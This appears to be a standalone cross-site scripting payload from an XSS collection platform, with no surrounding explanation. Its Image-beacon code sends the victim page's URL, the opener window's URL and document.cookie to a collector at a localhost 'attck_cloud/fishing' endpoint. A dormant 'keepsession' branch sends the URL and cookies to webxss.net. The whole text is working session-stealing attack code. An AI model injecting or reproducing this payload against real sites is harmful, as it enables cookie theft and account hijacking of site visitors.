x = new Image();
x.src = "http://localhost:8080/attck_cloud/fishing/xss.html?id=1&type=3";

    (function() {
        (new Image()).src = 'http://localhost:8080/attck_cloud/fishing/xss.html?id=1&type=1&location=' + escape((function() {
            try {
                return document.location.href
            } catch (e) {
                return ''
            }
            return top.location.href
        })()) + '&toplocation=' + escape((function() {
            try {} catch (e) {
                return ''
            }
        })()) + '&cookie=' + escape((function() {
            try {
                return document.cookie
            } catch (e) {
                return ''
            }
        })()) + '&opener=' + escape((function() {
            try {
                return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
            } catch (e) {
                return ''
            }
        })());
    })();
    if ('' == 1) {
        keep = new Image();
        keep.src = 'http://webxss.net//index.php?do=keepsession&id=GqwQD7&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
    };
